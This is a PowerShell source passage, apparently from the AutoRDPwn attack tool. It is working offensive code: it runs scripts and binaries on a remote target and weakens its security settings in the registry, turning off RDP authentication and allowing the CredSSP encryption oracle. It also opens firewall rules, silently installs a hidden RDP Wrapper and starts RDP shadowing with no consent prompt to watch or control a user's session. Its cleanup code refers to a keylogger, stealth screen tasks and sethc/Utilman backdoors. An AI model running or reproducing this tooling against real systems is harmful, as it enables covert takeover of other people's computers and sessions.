    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
    return $user
}

function Get-ARPlainPassword {
    $password = [string]$script:ARTarget['Password']
    if ($password -eq '') {
        $password = Read-ARSecret 'Password'
        $script:ARTarget['Password'] = $password
    }
    return $password
}

function Get-ARTargetCredential {
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
    $password = Get-ARPlainPassword
    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($user, $secure)
}

function Connect-ARTargetSession {
    param(
        [System.Management.Automation.PSCredential]$Credential = $null,
        [switch]$Force
    )
    $target = Get-ARTargetComputer
    if (-not $Force -and $script:ARSession) {
        $state = ''
        try { $state = [string]$script:ARSession.State } catch { }
        if ($state -eq 'Opened') {
            if ([string]$script:ARSession.ComputerName -eq $target) {
                Set-ARSessionState ('connected (' + $target + ')')
                return $script:ARSession
            }
            Close-ARTargetSession
        }
    }
    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($Credential) { $parameters['Credential'] = $Credential }
    # Bounded timeouts: an unreachable host must fail in ~15s, not hang for minutes.
    try {
        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout 15000 -OperationTimeout 180000 -CancelTimeout 5000
    }
    catch { }
    $session = New-PSSession @parameters
    $script:ARSession = $session
    Set-ARSessionState ('connected (' + $target + ')')
    return $session
}

function Close-ARTargetSession {
    if ($script:ARSession) {
        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    Set-ARSessionState ''
}

function Get-ARTargetSession {
    $session = Connect-ARTargetSession
    if (-not $session) { throw 'Unable to open a PowerShell session to the target.' }
    return $session
}

function Invoke-ARTargetCommand {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @()
    )
    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
    $session = Get-ARTargetSession
    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
}

function New-ARWorkDirectory {
    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    $script:ARWorkDirs.Add($directory)
    return $directory
}

function Copy-ARFileToTarget {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemotePath
    )
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
        return $destination
    }
    $session = Get-ARTargetSession
    $remoteDirectory = Split-Path -Parent $RemotePath
    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
        param($path)
        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
    } -ErrorAction Stop
    try {
        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
    }
    catch {
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $chunkSize = 48000
        $first = $true
        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
                param($path, $data, $create)
                $chunk = [Convert]::FromBase64String($data)
                if ($create) {
                    [System.IO.File]::WriteAllBytes($path, $chunk)
                }
                else {
                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
                }
            } -ErrorAction Stop
            $first = $false
        }
    }
    return $RemotePath
}

function Invoke-ARTargetPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath,
        [string]$Function = '',
        [hashtable]$Arguments = @{},
        [string]$Command = ''
    )
    $localPath = Get-ARResourcePath $RelativePath
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
        Push-Location $directory
        try {
            return (& {
                param($path, $functionName, $argumentMap, $commandText)
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            } $scriptPath $Function $Arguments $Command)
        }
        finally {
            Pop-Location
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
            param($path, $functionName, $argumentMap, $commandText)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Invoke-ARTargetBinary {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [string[]]$Arguments = @(),
        [string]$RemoteName = ''
    )
    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
    if (Test-ARIsLocalTarget) {
        return (& $LocalPath @Arguments 2>&1)
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $remotePath = Join-Path $remoteDirectory $RemoteName
    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
            param($path, $binaryArguments)
            & $path @binaryArguments 2>&1
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Get-ARPayloads {
    param([switch]$IncludeCreateUser)
    $payloads = New-Object System.Collections.Generic.List[string]
    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
        $value = Get-ARText $name ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    if ($IncludeCreateUser -or $script:ARCreateUser) {
        $value = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    return $payloads.ToArray()
}

function Get-ARSessionId {
    param($Lines = $null, [int]$Fallback = 1)
    # $Lines is kept for callers that still hand over `query session` output; that
    # output is localised, so it is only ever displayed, never parsed.
    $discovery = {
        try {
            $explorer = Get-CimInstance -ClassName Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction Stop |
                Sort-Object SessionId | Select-Object -Last 1
            if ($explorer -and [int]$explorer.SessionId -gt 0) { return [int]$explorer.SessionId }
        }
        catch { }
        try {
            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
                Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
                Sort-Object StartTime)
            foreach ($logon in $logons) {
                $processes = @(Get-CimAssociatedInstance -InputObject $logon -ResultClassName Win32_Process -ErrorAction SilentlyContinue)
                $ids = @($processes | Where-Object { $_.SessionId -gt 0 } | ForEach-Object { [int]$_.SessionId } | Sort-Object -Unique)
                if ($ids.Count -gt 0) { return [int]$ids[$ids.Count - 1] }
            }
        }
        catch { }
        return 0
    }
    $sessionId = 0
    $session = $null
    # A missing $script:ARTarget (early teardown, tests) must not turn this into a throw.
    $local = $true
    try { $local = Test-ARIsLocalTarget } catch { $local = $true }
    if ($Lines -is [System.Management.Automation.Runspaces.PSSession]) { $session = $Lines }
    elseif (-not $local) { $session = $script:ARSession }
    if ($session) {
        try { $sessionId = [int](Invoke-Command -Session $session -ScriptBlock $discovery -ErrorAction Stop) } catch { $sessionId = 0 }
    }
    elseif ($local) {
        try { $sessionId = [int](& $discovery) } catch { $sessionId = 0 }
    }
    if ($sessionId -gt 0) { return $sessionId }
    return $Fallback
}

function Install-ARRdpWrap {
    param([Parameter(Mandatory = $true)]$Session)
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
    Push-Location $script:ARTools
    try {
        . $scriptPath
        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
        $directory = New-ARWorkDirectory
        $msiPath = Join-Path $directory 'Setup.msi'
        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
        if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) }
        $uninstallRoots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
        $install = Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName, $uninstallRoots -ScriptBlock {
            param($msi, $rule, $roots)
            # Products present before this run: anything else in the diff came from us.
            $before = @{}
            foreach ($root in $roots) {
                if (-not (Test-Path -LiteralPath $root)) { continue }
                foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                    $before[$key.PSChildName] = [string](Get-ItemProperty -LiteralPath $key.PSPath -Name DisplayName -ErrorAction SilentlyContinue).DisplayName
                }
            }
            $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait -PassThru
            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
            $products = New-Object System.Collections.Generic.List[string]
            if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
                foreach ($root in $roots) {
                    if (-not (Test-Path -LiteralPath $root)) { continue }
                    foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                        if (-not $before.ContainsKey($key.PSChildName)) { $products.Add([string]$key.PSChildName) }
                    }
                }
            }
            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
            return [pscustomobject]@{ ExitCode = $process.ExitCode; Products = @($products.ToArray()) }
        } -ErrorAction Stop
        foreach ($product in @($install.Products)) {
            if ([string]::IsNullOrWhiteSpace([string]$product)) { continue }
            if (-not $script:ARInstalledProducts.Contains([string]$product)) { $script:ARInstalledProducts.Add([string]$product) }
        }
        if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
            Write-ARWarn ('RDPWrap installer returned ' + $install.ExitCode)
        }
    }
    finally {
        Pop-Location
    }
}

function Invoke-ARShadowEngine {
    $target = Get-ARTargetComputer
    $credential = $script:AROverrideCredential
    if (-not $credential) { $credential = Get-ARTargetCredential }
    $session = Get-ARTargetSession
    $control = $true
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }

    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $registryBackup = New-Object System.Collections.Generic.List[object]
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        # Every write records the previous state first so cleanup can replay it.
        function Save-ARRemoteValue($path, $name) {
            $entry = [pscustomobject]@{
                KeyPath = $path
                Name    = $name
                Existed = $false
                Value   = $null
                Kind    = 'String'
            }
            try {
                $key = Get-Item -LiteralPath $path -ErrorAction Stop
                if (@($key.GetValueNames()) -contains $name) {
                    $entry.Existed = $true
                    $entry.Value = $key.GetValue($name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                    $entry.Kind = [string]$key.GetValueKind($name)
                }
            }
            catch { }
            $registryBackup.Add($entry)
        }
        function Set-ARRemoteDword($path, $name, $value) {
            Save-ARRemoteValue $path $name
            New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
        }
        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
        Set-ARRemoteDword $terminalServer 'AllowRemoteRPC' 1
        Set-ARRemoteDword $terminalServer 'fDenyTSConnections' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' 'AllowAnonymousCallback' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'DisableRestrictedAdmin' 0
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareWks' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareServer' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowToGetHelp' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowFullControl' 1
        Set-ARRemoteDword $winstation 'SecurityLayer' 0
        Set-ARRemoteDword $winstation 'UserAuthentication' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy' 1
        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
        Set-ARRemoteDword 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' 'AllowEncryptionOracle' 2
        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
        }
        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $isServer = $caption -like '*Server*'
        $sessionId = $null
        if (-not $isServer) {
            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
            if (-not $sessionId) { $sessionId = 1 }
        }
        [pscustomobject]@{
            AllowRemoteRpc = $allowRemoteRpc
            IsServer = $isServer
            HostName = $env:COMPUTERNAME
            SessionId = $sessionId
            Caption = $caption
            RegistryBackup = @($registryBackup.ToArray())
        }
    }
    foreach ($entry in @($previous.RegistryBackup)) {
        if (-not $entry) { continue }
        # The oldest snapshot wins: a second run must not record the values it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }

        $plain = ''
        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
        if ($credential -and $plain -ne '') {
            # Tracked before the add: an interrupted run must still delete the credential.
            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
            $stored = $false
            try {
                cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
                if ($LASTEXITCODE -ne 0) { throw ('cmdkey /add exited with code ' + $LASTEXITCODE) }
                $stored = $true
            }
            catch {
                Write-ARWarn ('Stored credential for ' + $target + ' was not created: ' + $_.Exception.Message)
            }
            finally {
                if (-not $stored) { cmdkey.exe "/delete:$target" 2>&1> $null }
            }
        }
        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
            $script:ARSession = $null
            Start-Sleep -Seconds 60
            $session = $null
            for ($attempt = 0; $attempt -lt 30; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $session = Connect-ARTargetSession -Credential $credential -Force
                    if ($session) { break }
                } catch { }
            }
            if (-not $session) { throw 'The target did not come back after the reboot.' }
        }

        if ($previous.IsServer) {
            try {
                Invoke-Command -Session $session -ScriptBlock {
                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
            Show-ARText $query
            $sessionId = Get-ARSessionId -Lines $session -Fallback 1
            if (-not $script:ARInvokedFromOption) {
                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
            }
        }
        else {
            $sessionId = [int]$previous.SessionId
            if (-not $sessionId) { $sessionId = 1 }
            try { Install-ARRdpWrap -Session $session }
            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
        }

        $arguments = @("/v:$target", '/admin')
        if ($sessionId) {
            $arguments += "/shadow:$sessionId"
            $arguments += '/noconsentprompt'
            if ($control) { $arguments += '/control' }
        }
        $arguments += '/f'
        if ($script:ARNoGui) {
            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
        }
        else {
            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
        }
        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
}


function Invoke-ARAction {
    param([Parameter(Mandatory = $true)][string]$Id)
    $action = Get-ARActionById $Id
    if (-not $action) {
        Write-ARError 'Unknown action.'
        return
    }
    Clear-ARScreen
    Set-ARStatus ($action.Title) 'Info'
    $script:ARLastFailure = ''
    try {
        & $action.Handler
        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
    }
    catch {
        $script:ARLastFailure = $_.Exception.Message
        Set-ARStatus $_.Exception.Message 'Error'
        Write-ARError $_.Exception.Message
    }
    if (-not $script:ARInvokedFromOption) {
        Write-ARBlank
        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
    }
}

function Remove-ARTargetArtifacts {
    param([System.Management.Automation.Runspaces.PSSession]$Session)
    $status = [pscustomobject]@{
        HadSession = $false
        Errors     = 0
        Skipped    = New-Object System.Collections.Generic.List[string]
    }
    if (-not $Session) {
        $status.Skipped.Add('target session')
        return $status
    }
    $status.HadSession = $true
    $tempDirs = @($script:ARRemoteTempDirs.ToArray())
    $accounts = @($script:ARCreatedAccounts.ToArray())
    if ($script:ARHashUserName -ne '') { $accounts += $script:ARHashUserName }
    $rules = @($script:ARFirewallRules.ToArray())
    try {
        Invoke-Command -Session $Session -ArgumentList $tempDirs, $accounts, $rules -ScriptBlock {
            param($dirs, $users, $firewallRules)
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
            # Tasks created by the stealth screen module survive an interrupted run.
            try {
                Get-ScheduledTask -ErrorAction Stop | Where-Object {
                    $_.TaskName -like 'AutoRDPwn*' -or ($_.TaskName -match '^W[0-9A-F]{8}$' -and (($_.Actions | ForEach-Object { [string]$_.Execute + ' ' + [string]$_.Arguments }) -join ' ') -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1')
                } | ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                }
            }
            catch { }
            Remove-Item -LiteralPath 'C:\Windows\Temp\vncb64.txt', 'C:\Windows\Temp\vnc.ps1', 'C:\Windows\Temp\vnclog.txt', 'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
            Get-ChildItem -LiteralPath 'C:\Windows\Temp' -Directory -Filter 'AutoRDPwn*' -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($directory in $dirs) {
                Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
            }
            foreach ($service in @('WinShotSvc', 'WinSessionSvc')) {
                if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
                    sc.exe stop $service 2>&1> $null
                    sc.exe delete $service 2>&1> $null
                }
            }
            foreach ($userName in $users) {
                if (-not $userName) { continue }
                try {
                    if (Get-LocalUser -Name $userName -ErrorAction Stop) {
                        net user $userName /delete 2>&1> $null
                        Remove-Item -LiteralPath (Join-Path 'C:\Users' $userName) -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($key in @('sethc.exe', 'Utilman.exe')) {
                $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
                try {
                    $debugger = (Get-ItemProperty -Path $path -Name 'Debugger' -ErrorAction Stop).Debugger
                    if ([string]$debugger -like 'powershell.exe -noexit*') {
                        Remove-ItemProperty -Path $path -Name 'Debugger' -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($rule in @($firewallRules + 'AutoRDPwn-TermService-RPC-In')) {
                netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            }
        } -ErrorAction Stop | Out-Null
    }
    catch {
        $status.Errors++
        $status.Skipped.Add('target artifacts')
        Write-ARWarn ('Target cleanup incomplete: ' + $_.Exception.Message)
    }

    # Registry values written by the shadow engine: replay the state read before each write.
    $registryBackup = @($script:ARRegistryBackup.ToArray())
    if ($registryBackup.Count -gt 0) {
        try {
            $failures = @(Invoke-Command -Session $Session -ArgumentList $registryBackup -ScriptBlock {
                param($entries)
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($entry in $entries) {
                    $path = [string]$entry.KeyPath
                    $name = [string]$entry.Name
                    try {
                        if (-not (Test-Path -LiteralPath $path)) { continue }
                        if (-not $entry.Existed) {
                            Remove-ItemProperty -Path $path -Name $name -Force -ErrorAction SilentlyContinue
                            continue
                        }
                        $kind = [string]$entry.Kind
                        $value = $entry.Value
                        if ($kind -eq 'MultiString') { $value = [string[]]@($entry.Value) }
                        elseif ($kind -eq 'Binary') { $value = [byte[]]@($entry.Value) }
                        elseif ($kind -eq 'DWord' -or $kind -eq 'QWord') { $value = [int64]$entry.Value }
                        else { $value = [string]$entry.Value }
                        New-ItemProperty -Path $path -Name $name -Value $value -PropertyType $kind -Force -ErrorAction SilentlyContinue | Out-Null
                    }
                    catch { $failed.Add($name + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            } -ErrorAction Stop)
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('registry: ' + [string]$failure)
                Write-ARWarn ('Registry value not restored: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('registry restore')
            Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message)
        }
        $script:ARRegistryBackup.Clear()
    }

    # MSI products that appeared during this run: uninstall them by product code.
    $products = @($script:ARInstalledProducts.ToArray())
    if ($products.Count -gt 0) {
        try {
            $failures = @(Invoke-Command -Session $Session -ArgumentList $products -ScriptBlock {
                param($productCodes)
                $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($code in $productCodes) {
                    try {
                        if ([string]$code -match '^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$') {
                            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/x', [string]$code, '/qn', '/norestart') -Wait
                        }
                        foreach ($root in $roots) {
                            $key = Join-Path $root ([string]$code)
                            if (Test-Path -LiteralPath $key) { Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue }
                        }
                    }
                    catch { $failed.Add([string]$code + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            } -ErrorAction Stop)
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('msi: ' + [string]$failure)
                Write-ARWarn ('MSI product not removed: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('msi uninstall')
            Write-ARWarn ('MSI uninstall incomplete: ' + $_.Exception.Message)
        }
        $script:ARInstalledProducts.Clear()
    }
    return $status
}

function Invoke-ARCleanup {
    if ($script:ARCleanupDone) { return }
    $script:ARCleanupDone = $true
    $targetStatus = $null
    if (-not $script:ARNoClean) {
        $targetStatus = Remove-ARTargetArtifacts -Session $script:ARSession
        $script:ARHashUserName = ''
    }
    # Operator-side traces are always removed, even with -noclean: a stored
    # credential or an extracted binary must not outlive the session.
    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
        cmdkey.exe "/delete:$target" 2>&1> $null
    }
    $script:ARCmdKeyTargets.Clear()
    # Module artifacts (keylogger log, RDP cache) live on the target, so they
    # have to go while the session is still open. The operator-side proxy reset
    # below can wait until after teardown.
    if (Get-Command Remove-ARModuleArtifacts -ErrorAction SilentlyContinue) {
        try { Remove-ARModuleArtifacts } catch { }
    }
    Close-ARTargetSession
    Restore-ARDefender
    foreach ($directory in $script:ARWorkDirs.ToArray()) {
        if (Test-Path -LiteralPath $directory) {
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
        if (Test-Path -LiteralPath $file) {
            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
        }
    }
    $script:ARWorkDirs.Clear()
    $script:ARTemporaryFiles.Clear()
    $script:ARRemoteTempDirs.Clear()
    $script:ARRemoteTasks.Clear()
    $script:ARCreatedAccounts.Clear()
    $script:ARFirewallRules.Clear()
    $script:AROverrideCredential = $null
    if (Get-Command Reset-AROperatorPortProxies -ErrorAction SilentlyContinue) {
        try { Reset-AROperatorPortProxies } catch { }
    }
    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
    if ($targetStatus -and -not $targetStatus.HadSession) {
        $targetName = 'the target'
        try { $targetName = Get-ARTargetComputer } catch { }
        Write-ARWarn ('Cleanup skipped: no session to ' + $targetName)
    }
    elseif ($targetStatus -and $targetStatus.Errors -gt 0) {
        $steps = @($targetStatus.Skipped | Select-Object -First 5)
